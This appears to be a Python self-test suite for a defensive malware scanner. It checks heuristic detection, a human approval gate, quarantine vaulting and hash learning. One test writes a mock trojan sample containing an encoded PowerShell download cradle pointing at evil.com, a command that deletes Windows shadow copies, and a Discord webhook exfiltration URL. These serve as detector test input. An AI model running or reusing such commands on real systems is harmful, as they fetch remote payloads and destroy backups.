"""
SentinelAegis-X - Comprehensive Self-Test & Verification Suite
Validates static analysis, human gate locking, quarantine vaulting, and learning engine.
"""

import os
import sys

# Ensure root in path
sys.path.insert(0, os.path.abspath(os.path.join(os.path.dirname(__file__), "..")))

from core.analyzer import MalwareAnalyzer
from core.human_gate import HumanGate, IncidentStatus
from core.remediation import RemediationEngine
from core.learning_engine import ThreatLearningEngine


def run_tests():
    print("=== [1] Testing Malware Analyzer Heuristics ===")
    analyzer = MalwareAnalyzer(rules_path="config/rules.json")
    
    # Create benign test file
    os.makedirs("intel_cache/test_samples", exist_ok=True)
    benign_path = "intel_cache/test_samples/benign_calc.txt"
    with open(benign_path, "w") as f:
        f.write("print('Hello safe security test'); x = 10 + 20")
    
    benign_res = analyzer.analyze_file(benign_path)
    print(f"Benign Sample: Score={benign_res['threat_score']}, Verdict={benign_res['verdict']}")
    assert benign_res["verdict"] == "SAFE", "Benign test failed"

    # Create mock malicious test sample (Reverse TCP & Obfuscated PowerShell)
    sus_path = "intel_cache/test_samples/simulated_trojan.ps1"
    with open(sus_path, "w") as f:
        f.write(
            "powershell -encodedcommand SUVYIChOZXctT2JqZWN0IE5ldC5XZWJDbGllbnQpLkRvd25sb2FkU3RyaW5n('http://evil.com/payload') "
            "vssadmin delete shadows /all /quiet "
            "discord.com/api/webhooks/123456789/abcdefgh "
        )
    
    sus_res = analyzer.analyze_file(sus_path)
    print(f"Malicious Sample: Score={sus_res['threat_score']}, Classification={sus_res['classification']}")
    print(f"Detected reasons: {sus_res['reasons']}")
    assert sus_res["threat_score"] >= 75, "Malware detection test failed"

    print("\n=== [2] Testing Human Gate (Zero Autonomous Action Enforcement) ===")
    gate = HumanGate()
    incident = gate.register_threat(sus_res)
    inc_id = incident["incident_id"]
    print(f"Registered Incident: {inc_id}, Status={incident['status']}")
    assert incident["status"] == IncidentStatus.PENDING, "Incident should be pending human approval"

    print("\n=== [3] Testing Remediation Vault (XOR Scrambling & Quarantine) ===")
    remediation = RemediationEngine(vault_path="./vault")
    
    # Attempting remediation before approval is denied in our architecture
    # Now simulate Operator approving quarantine
    approval = gate.approve_action(inc_id, "QUARANTINE", operator_name="AdminUser")
    assert approval["success"] is True
    print(f"Human Gate Approved: Status={approval['incident']['status']}")

    rem_result = remediation.execute_approved_remediation(approval["incident"])
    print(f"Remediation Result: {rem_result}")
    
    # Verify original file is wiped from disk and encrypted in vault
    assert not os.path.exists(sus_path), "Original malicious file should be wiped from source directory"
    vault_files = [f for f in os.listdir("./vault") if f.endswith(".vault")]
    assert len(vault_files) > 0, "Vault must contain the XOR scrambled payload"
    print(f"Vault securely holds: {vault_files}")

    print("\n=== [4] Testing Threat Learning Engine ===")
    learner = ThreatLearningEngine()
    learner.learn_from_sample(sus_res)
    sha256 = sus_res["hashes"]["sha256"]
    rep = learner.check_hash_reputation(sha256)
    print(f"Learner verification for {sha256[:16]}...: {rep}")
    assert rep["is_known_malware"] is True, "Learning engine should index new malware"

    print("\n>>> ALL DEFENSIVE ENGINE TESTS PASSED SUCCESSFULLY! <<<")


if __name__ == "__main__":
    run_tests()
